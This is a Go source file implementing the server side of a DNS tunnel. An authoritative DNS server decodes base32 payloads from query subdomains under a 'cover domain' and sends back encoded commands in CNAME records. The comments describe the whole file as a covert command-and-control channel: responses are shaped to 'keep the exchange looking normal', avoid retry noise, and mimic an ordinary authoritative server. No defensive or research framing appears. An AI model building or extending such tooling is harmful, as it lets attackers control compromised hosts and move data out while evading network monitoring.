package transport

import (
	"fmt"
	"strings"
	"sync"

	"github.com/miekg/dns"
)

// =============================================================================
// DNS Handler — controller-side authoritative DNS server
// =============================================================================
//
// DNSHandler is the server-side counterpart to DNSTransport. It runs a
// DNS authoritative server that:
//   1. Receives A-record queries for the cover domain
//   2. Decodes the base32 payload from the question subdomain
//   3. Passes the raw bytes to a HandlerFunc for processing
//   4. Encodes the response as a CNAME record
//
// The handler replies to ANY query under the configured zone (cover domain)
// with a CNAME response. Queries for other domains return REFUSED (not
// NXDOMAIN — that would invite retries from resolvers and create noise).
//
// Usage:
//
//	handler := NewDNSHandler(DNSHandlerConfig{
//	    Zone:      "sync.example.com",
//	    Version:   "v1",
//	    ListenAddr: ":53",
//	    Handler: func(payload []byte) []byte {
//	        // Decrypt, process, return response.
//	        return responsePayload
//	    },
//	})
//	go handler.ListenAndServe()
//	// ...
//	handler.Shutdown()

// =============================================================================
// Types
// =============================================================================

// DNSHandlerFunc processes a decoded payload and returns the response
// bytes to be encoded into the CNAME target. Returning nil or an empty
// slice means "no command" — the server still responds with a valid
// CNAME (carrying an empty payload) to keep the exchange looking normal.
type DNSHandlerFunc func(payload []byte) []byte

// DNSHandlerConfig holds configuration for DNSHandler.
type DNSHandlerConfig struct {
	// Zone is the authoritative domain. The handler responds only
	// to queries under this zone.
	Zone string

	// Version is the protocol version string.
	Version string

	// ListenAddr is the UDP listen address, e.g. ":53" or
	// "0.0.0.0:5353".
	ListenAddr string

	// Handler processes decoded payloads. Must be set.
	Handler DNSHandlerFunc

	// Logger receives diagnostic messages. Optional.
	Logger func(format string, args ...interface{})
}

// DNSHandler runs the controller-side DNS authoritative server.
type DNSHandler struct {
	cfg DNSHandlerConfig
	obf *DNSObfuscator

	server *dns.Server
	wg     sync.WaitGroup
}

// NewDNSHandler creates a DNSHandler from the given config.
func NewDNSHandler(cfg DNSHandlerConfig) (*DNSHandler, error) {
	if cfg.Zone == "" {
		return nil, fmt.Errorf("dns handler: zone is required")
	}
	if cfg.ListenAddr == "" {
		cfg.ListenAddr = ":53"
	}
	if cfg.Handler == nil {
		return nil, fmt.Errorf("dns handler: Handler func is required")
	}

	obf := NewDNSObfuscator(cfg.Zone, cfg.Version)

	return &DNSHandler{
		cfg: cfg,
		obf: obf,
	}, nil
}

// =============================================================================
// Lifecycle
// =============================================================================

// ListenAndServe starts the DNS server and blocks until Shutdown is
// called or an unrecoverable error occurs. Call this in a goroutine
// if you need to do other work.
func (h *DNSHandler) ListenAndServe() error {
	h.server = &dns.Server{
		Addr: h.cfg.ListenAddr,
		Net:  "udp",
		// Handler is set on the ServeMux below.
	}

	mux := dns.NewServeMux()
	mux.HandleFunc(h.cfg.Zone+".", h.handleQuery)
	h.server.Handler = mux

	h.debug("[dns-handler] listening on %s (zone: %s)", h.cfg.ListenAddr, h.cfg.Zone)

	h.wg.Add(1)
	defer h.wg.Done()

	return h.server.ListenAndServe()
}

// Shutdown gracefully stops the DNS server.
func (h *DNSHandler) Shutdown() error {
	if h.server != nil {
		return h.server.Shutdown()
	}
	return nil
}

// =============================================================================
// Query handling
// =============================================================================

func (h *DNSHandler) handleQuery(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true
	m.RecursionAvailable = false // we're authoritative, not a recursor

	// Only respond to A-record queries. Anything else (AAAA, TXT,
	// MX, etc.) gets a NOERROR with no answers — looks like a
	// normal authoritative server that doesn't have that record type.
	if len(r.Question) == 0 {
		w.WriteMsg(m)
		return
	}
	q := r.Question[0]
	if q.Qtype != dns.TypeA {
		h.debug("[dns-handler] non-A query (%s) — empty response", dns.TypeToString[q.Qtype])
		w.WriteMsg(m)
		return
	}

	// Decode payload from the question name.
	payload, seq, err := h.obf.decodeFromQuestion(q.Name)
	if err != nil {
		// Question name doesn't match our encoding pattern.
		// Reply with NOERROR + SOA in the authority section
		// — this is the normal response for a valid domain
		// query at the apex.
		h.debug("[dns-handler] decode skipped: %v", err)
		h.addSOA(m)
		w.WriteMsg(m)
		return
	}

	h.debug("[dns-handler] query decoded: %d bytes payload, seq=%d", len(payload), seq)

	// Process the payload through the handler.
	response := h.cfg.Handler(payload)
	if response == nil {
		response = []byte{}
	}

	// Encode response as a CNAME record.
	cnameTarget := h.obf.encodeToCNAME(response, seq)
	rr := &dns.CNAME{
		Hdr:    dns.RR_Header{Name: q.Name, Rrtype: dns.TypeCNAME, Class: dns.ClassINET, Ttl: 60},
		Target: cnameTarget,
	}
	m.Answer = append(m.Answer, rr)

	w.WriteMsg(m)
}

// =============================================================================
// Helpers
// =============================================================================

// addSOA appends a minimal SOA record to the authority section so the
// response looks like a normal authoritative NXDOMAIN-free reply.
func (h *DNSHandler) addSOA(m *dns.Msg) {
	soa := &dns.SOA{
		Hdr: dns.RR_Header{
			Name:   h.cfg.Zone + ".",
			Rrtype: dns.TypeSOA,
			Class:  dns.ClassINET,
			Ttl:    3600,
		},
		Ns:      "ns1." + h.cfg.Zone + ".",
		Mbox:    "admin." + h.cfg.Zone + ".",
		Serial:  2024010101,
		Refresh: 3600,
		Retry:   900,
		Expire:  86400,
		Minttl:  300,
	}
	m.Ns = append(m.Ns, soa)
}

func (h *DNSHandler) debug(format string, args ...interface{}) {
	if h.cfg.Logger != nil {
		h.cfg.Logger(format, args...)
	}
}

// =============================================================================
// Server-side decode from question
// =============================================================================

// decodeFromQuestion extracts the payload and sequence byte from a DNS
// question name like:
//
//	ghr23sdf567hgf852xyz.a.v1.sync.example.com.
func (o *DNSObfuscator) decodeFromQuestion(qname string) ([]byte, byte, error) {
	// Strip zone suffix.
	suffix := "." + strings.ToLower(o.CoverDomain) + "."
	qname = dns.Fqdn(qname)
	qnameLower := strings.ToLower(qname)

	if !strings.HasSuffix(qnameLower, suffix) {
		return nil, 0, fmt.Errorf("not under zone")
	}

	// Strip the zone suffix to get the labels.
	prefix := strings.TrimSuffix(qnameLower, suffix)
	prefix = strings.TrimSuffix(prefix, ".")
	labels := strings.Split(prefix, ".")

	if len(labels) < 3 {
		return nil, 0, fmt.Errorf("too few labels: got %d, need 3+", len(labels))
	}

	// Last = version, second-to-last = seq, rest = payload.
	versionLabel := labels[len(labels)-1]
	seqLabel := labels[len(labels)-2]
	encodedLabels := labels[:len(labels)-2]

	if versionLabel != o.Version {
		return nil, 0, fmt.Errorf("version mismatch: got %q, want %q", versionLabel, o.Version)
	}

	seqBytes, err := dnsBase32.DecodeString(seqLabel)
	if err != nil || len(seqBytes) == 0 {
		return nil, 0, fmt.Errorf("invalid seq label %q", seqLabel)
	}

	encoded := strings.Join(encodedLabels, "")
	payload, err := dnsBase32.DecodeString(encoded)
	if err != nil {
		return nil, 0, fmt.Errorf("base32 decode: %w", err)
	}

	return payload, seqBytes[0], nil
}

// encodeToCNAME builds the CNAME target from response payload and ack byte:
//
//	<base32_response>.<ack>.v1.sync.example.com.
func (o *DNSObfuscator) encodeToCNAME(payload []byte, ack byte) string {
	encoded := dnsBase32.EncodeToString(payload)
	labels := splitLabels(encoded, maxLabelLen)

	ackStr := dnsBase32.EncodeToString([]byte{ack})
	labels = append(labels, ackStr, o.Version)

	fqdn := strings.Join(labels, ".") + "." + o.CoverDomain + "."
	return strings.ToLower(fqdn)
}
